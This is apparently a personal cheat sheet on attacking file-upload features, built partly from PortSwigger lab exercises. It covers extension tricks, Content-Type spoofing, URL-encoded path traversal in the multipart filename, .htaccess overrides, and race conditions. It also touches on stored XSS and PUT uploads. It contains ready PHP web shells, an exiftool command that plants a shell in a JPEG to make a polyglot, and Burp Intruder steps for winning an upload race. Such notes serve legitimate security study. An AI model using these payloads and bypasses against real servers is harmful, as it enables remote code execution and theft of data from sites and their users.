# File upload

## RFI2RCE

### File extension

- `shell.php.jpg`
    - May be interpreted as either php or jpg
- `shell.pHp`
    - [x] Validation code is case-sensitive
    - [x] MIME type that it translates to is case-insensitive
- `shell.php%00.jpg`
    - [x] Validation in frontend
    - [x] High-level frontend (PHP/Java/Python)
    - [x] No validation in backend
    - [x] Low-level backend (C/C++)
- `shell.ph.phpp`
    - [x] Dangerous extensions are removed from the filename

### HTTP Content-Type

Some applications determine the MIME type of the uploaded file based on the Content-Type header in the HTTP request. For example:
```http
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 39

<?php echo system($_GET['command']); ?>
```
Since the uploaded file is a php script, the MIME type is automatically set to application/octet-stream. The application thus refuses the file. However, using Burp Suite to capture the request, we can change it.
```http
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

### HTTP multipart/form-data filename section

Usually, the filename section of a multipart/form-data request is used to determine where to save the file to. This can be exploited via path traversal to save files to directories where user input isn't expected (such as `/var/www/html`) or unprotected directories to bypass lack of execution rights in a directory.
```http
...
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundarytZem8Coz6aZb41pr
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php system('cat /home/carlos/secret') ?>
...
```

The above is an example payload from a Portswigger lab. The name of the file we want to upload is `shell.php`. However, we do not have executable rights in the directory where the file is saved. Thus, we can edit the filename to this:

```http
...
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundarytZem8Coz6aZb41pr
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: application/octet-stream

<?php system('cat /home/carlos/secret') ?>
...
```

In the example lab, dot-dot-slash sequences will be filtered out, so we can urlencode the slash to achieve directory traversal. Thus, we have successfully achieved RCE.

### Override .htaccess or web.config

Sometimes, applications will make use of .htaccess in Apache to "map" MIME types to file extensions. If the .htaccess file is overwritten, we can specify arbitrary file extensions to executable MIME types like `application/x-httpd-php`.

```.htaccess
AddType application/x-httpd-php .vim
```

Afterwards, we can just upload a shell.vim file and get RCE.

### Bypass magic bytes/file contents check

Applications may attempt to check the magic bytes of an uploaded file to ensure that the file is safe to upload. However, we can make use of polyglots:

`(with existing jpg named vim.jpg) ./exiftool.exe -Comment="<?php echo 'FLAG:'; system($_GET['cmd']); __halt_compiler(); ?>" ./vim.jpg; mv ./vim.jpg vim.php`

The comment will be executed as it exists as plaintext inside the JPG. It is possible to combine this with [Override .htaccess](#override-.htaccess-or-web.config), setting .jpg to MIME application/x-httpd-php. 

### Race condition

A race condition can occur when the file is first saved onto disk, then validated. To exploit this, send a jpg polyglot file upload request to Burp Intruder. Set Payload Type to 'Null payload' under the Payloads tab, and Payload Options to 'Continue indefinitely'.

Then make a new request to where the jpg polyglot would have been if it wasn't deleted, and send that request to Burp Intruder with the same options as well. 

The last step is to start both attacks, and look out for a 200 status code or some other indicator in the second Intruder attack that determines if the attack was successful. This might take a while depending on how fast the application deletes the file.

It is possible to upload a persistent shell by running a command to move the malicious file to another filename/directory. Then just access the shell through its new filename. This is convienient if you don't want to have to run a new attack each time you need to run a new command.

#### The application is deleting my files too quickly!!

You can try to increase the amount of time taken to process the file by uploading an extremely large file, with the payload at the start. 

#### The application randomizes my directory/filename!!

There's no other way but to bruteforce :( The PHP function `uniqid()` is especially vulnerable to bruteforce as it's pseudo-random.

## RFI but no RCE

### Stored XSS

If the application allows you to upload HTML or SVG, you can upload `<script>` tags to run when someone else visits the site. Note that due to same-origin policy restrictions, these attacks will only work if the uploaded file is served from the same origin to which you uploaded it. 

#### [Same-Origin policy](https://portswigger.net/web-security/cors/same-origin-policy)

Prevents websites from attacking one another by only allowing scripts from a certain source to execute on the same source. Without this policy, a malicious website would be able to read your posts on Facebook or emails in Gmail.

| URL								| Allowed?								|
| --------------------------------- | ------------------------------------- |
| https://example.com/example		| Yes, same scheme, domain and port		|
| https://example.com/example2		| Yes, same scheme, domain and port		|
| http://example.com/example		| No, different scheme and port			|
| https://www.example.com/example	| No, different domain					|
| https://example.com:8080/example	| No, different port (yes for IE)		|

## RFI via PUT

Some applications may not even have a file upload interface, but are configured to parse PUT requests. If appropriate defenses aren't put in place, this can provide another way to achieve RFI2RCE.

> You can try sending OPTIONS requests to check for endpoints that advertise their support for PUT.
